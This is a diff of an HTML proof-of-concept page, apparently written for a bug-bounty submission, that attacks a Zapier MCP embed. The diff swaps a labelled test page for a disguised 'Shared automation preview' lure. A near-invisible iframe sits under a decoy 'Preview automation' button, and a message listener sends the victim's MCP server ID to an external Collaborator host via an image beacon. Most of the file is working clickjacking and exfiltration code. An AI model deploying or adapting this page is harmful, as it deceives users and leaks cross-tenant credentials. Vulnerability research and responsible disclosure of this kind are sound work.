@@ -1,59 +1,59 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Zapier MCP Embed cross-tenant PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Shared automation preview</title>
 <style>
-  body { font: 16px system-ui, sans-serif; margin: 24px; }
-  #embed { display: block; width: 200px; height: 140px; border: 0; background: #fff; }
-  #cover { display: none; position: absolute; inset: 0; pointer-events: none; background: #fff; }
-  #decoy { position: absolute; left: var(--target-x); top: var(--target-y); transform: translate(-50%, -50%); padding: 14px 24px; border: 0; border-radius: 7px; color: #fff; background: #503eb6; font: 600 16px system-ui, sans-serif; box-shadow: 0 2px 8px #0003; }
-  body.clickjack #embed { position: absolute; left: var(--frame-x); top: var(--frame-y); opacity: var(--frame-opacity); z-index: 2; }
-  body.clickjack #cover { display: block; z-index: 3; }
-  body.clickjack #decoy { z-index: 4; }
+  :root { --target-x: 320px; --target-y: 360px; --frame-x: 0px; --frame-y: 0px; --frame-opacity: .01; }
+  * { box-sizing: border-box; }
+  body { margin: 0; min-height: 100vh; display: grid; place-items: center; color: #201f2b; background: #f6f5fa; font: 16px system-ui, sans-serif; }
+  #stage { position: relative; width: 640px; max-width: 100vw; height: 720px; overflow: hidden; background: #fff; box-shadow: 0 18px 60px #271f4a24; }
+  #embed { position: absolute; z-index: 2; left: var(--frame-x); top: var(--frame-y); width: 640px; height: 720px; border: 0; opacity: var(--frame-opacity); }
+  #lure { position: absolute; z-index: 3; inset: 0; padding: 72px 64px; text-align: center; pointer-events: none; background: linear-gradient(145deg,#fff 0%,#f7f5ff 100%); }
+  .icon { display: grid; place-items: center; width: 72px; height: 72px; margin: 0 auto 28px; border-radius: 20px; color: #fff; background: #503eb6; font-size: 34px; }
+  h1 { margin: 0 0 14px; font-size: 30px; }
+  p { max-width: 460px; margin: 0 auto; color: #625e70; line-height: 1.55; }
+  #decoy { position: absolute; left: var(--target-x); top: var(--target-y); transform: translate(-50%,-50%); width: 193px; height: 36px; border: 0; border-radius: 6px; color: #fff; background: #503eb6; font: 600 15px system-ui,sans-serif; box-shadow: 0 3px 10px #503eb64d; }
+  .hint { position: absolute; left: 0; right: 0; bottom: 70px; font-size: 13px; color: #898594; }
 </style>
-<h1>Zapier MCP Embed cross-tenant PoC</h1>
-<p id="mode"></p>
-<pre id="status">Waiting for the embed to disclose the victim MCP server URL...</pre>
+
+<main id="stage">
   <!-- Triager: replace this researcher embed ID with your own embed ID before testing. -->
   <iframe id="embed" src="https://mcp.zapier.com/embed?embedId=96e091d4-559c-4bcd-baff-c1b9cfcec23b" title="Zapier MCP Embed"></iframe>
-  <div id="cover"><button id="decoy" tabindex="-1">Continue</button></div>
+  <section id="lure">
+    <div class="icon">↗</div>
+    <h1>Shared automation preview</h1>
+    <p>A workflow template has been shared with you. Preview its steps before adding it to your workspace.</p>
+    <button id="decoy" tabindex="-1">Preview automation</button>
+    <div class="hint">The preview opens securely in a new window.</div>
+  </section>
+</main>
+
 <script>
 // Triager: replace this researcher Collaborator hostname with your own Burp Collaborator hostname.
 const COLLABORATOR = 'g3k7pimmmjnv1xnpfgfkxrejza51tthi.oastify.com';
 const query = new URLSearchParams(location.search);
-const selectedMode = query.get('mode') === 'clickjack' ? 'clickjack' : 'static';
 const numberParam = (name, fallback) => {
   const value = Number(query.get(name));
   return Number.isFinite(value) ? value : fallback;
 };
 
-document.body.classList.toggle('clickjack', selectedMode === 'clickjack');
-document.body.style.setProperty('--frame-x', `${numberParam('frameX', 0)}px`);
-document.body.style.setProperty('--frame-y', `${numberParam('frameY', 0)}px`);
-document.body.style.setProperty('--target-x', `${numberParam('targetX', 320)}px`);
-document.body.style.setProperty('--target-y', `${numberParam('targetY', 360)}px`);
-document.body.style.setProperty('--frame-opacity', String(numberParam('opacity', 0.08)));
-document.getElementById('mode').textContent = selectedMode === 'clickjack'
-  ? 'Clickjacking test mode. Align the real Zapier button beneath Continue with frameX/frameY and targetX/targetY query parameters. Start with opacity=0.5, then lower it after alignment.'
-  : 'Static mode. The complete 640×720 Zapier embed is visible. Use ?mode=clickjack to test the overlay mode.';
+// Alignment controls: start with ?opacity=.5, adjust coordinates, then use opacity=.01.
+document.documentElement.style.setProperty('--frame-x', `${numberParam('frameX', 0)}px`);
+document.documentElement.style.setProperty('--frame-y', `${numberParam('frameY', 0)}px`);
+document.documentElement.style.setProperty('--target-x', `${numberParam('targetX', 320)}px`);
+document.documentElement.style.setProperty('--target-y', `${numberParam('targetY', 360)}px`);
+document.documentElement.style.setProperty('--frame-opacity', String(numberParam('opacity', .01)));
 
-const status = document.getElementById('status');
 let sent = false;
-
 window.addEventListener('message', (event) => {
   if (event.origin !== 'https://mcp.zapier.com' || sent) return;
   if (event.data?.type !== 'mcp-server-url') return;
-
-  const serverUrl = event.data?.data?.serverUrl;
-  const match = String(serverUrl).match(/\/api\/mcp\/embed\/([0-9a-f-]{36})\/mcp/i);
-  if (!match) {
-    status.textContent = 'Received an unexpected MCP server URL: ' + String(serverUrl);
-    return;
-  }
-
+  const match = String(event.data?.data?.serverUrl).match(/\/api\/mcp\/embed\/([0-9a-f-]{36})\/mcp/i);
+  if (!match) return;
   sent = true;
-  const serverId = match[1];
   const beacon = new Image();
-  beacon.src = `https://${COLLABORATOR}/zapier-mcp-embed/${serverId}?cache=${Date.now()}`;
-  status.textContent = 'Captured victim MCP server ID and sent it to Burp Collaborator: ' + serverId;
+  beacon.src = `https://${COLLABORATOR}/zapier-mcp-embed/${match[1]}?cache=${Date.now()}`;
+  document.querySelector('#lure h1').textContent = 'Preview opened';
+  document.querySelector('#lure p').textContent = 'You can close this page.';
 });
 </script>
